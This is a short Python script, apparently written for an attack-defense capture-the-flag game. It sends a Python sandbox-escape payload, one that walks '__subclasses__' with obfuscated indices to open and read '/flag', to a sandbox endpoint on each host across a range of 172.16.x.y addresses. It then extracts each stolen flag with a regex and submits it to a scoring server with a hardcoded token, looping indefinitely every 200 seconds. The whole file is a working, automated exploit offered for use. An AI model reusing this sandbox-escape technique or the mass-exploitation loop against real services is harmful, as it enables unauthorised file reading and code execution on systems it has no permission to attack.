import requests
import re
import time

submit_flag_url = 'http://10.10.10.10:9000/submit_flag/'
token = 'dxUrnS8uMQ9Yb2dNvZ372595jQZZEnmxZrtBarnw2zu7UAeMses2929YMrDdBy4w5n97jYuKaRE'


def attack_1():
    url_template = 'http://172.16.{}.{}:1337/sand_box_xixi_haha'
    data = '().__class__.__bases__[3-3].__subclasses__()[(3+5)*5]("/fl"+"ag").read()'

    for num in range(13, 15):
        for i in range(1, 25):
            print(f'{i}.{num}')
            url = url_template.format(i, num)
            try:
                r = requests.post(url, data={'cmd': data}, timeout=2)
                flag = re.search('Return:(.{60})', r.text).group(1)
                print(requests.post(submit_flag_url, data={'flag': flag, 'token': token}).text)
            except Exception as e:
                print(e)
                pass


while True:
    attack_1()
    time.sleep(200)
